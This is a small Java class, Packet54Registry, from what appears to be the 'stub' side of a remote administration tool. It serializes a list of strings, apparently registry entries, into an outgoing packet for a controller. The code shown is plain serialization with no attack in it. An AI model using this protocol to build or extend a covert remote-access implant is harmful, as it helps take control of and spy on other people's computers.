package com.redpois0n.stub.packets.outgoing;

import java.io.DataOutputStream;

import com.redpois0n.common.io.StringWriter;

public class Packet54Registry extends AbstractOutgoingPacket {
	
	private String[] args;
	
	public Packet54Registry(String[] args) {
		this.args = args;
	}

	@Override
	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
		dos.writeInt(args.length);
	
		for (String arg : args) {
			sw.writeLine(arg);
		}
	}

	@Override
	public byte getPacketId() {
		return 54;
	}

}
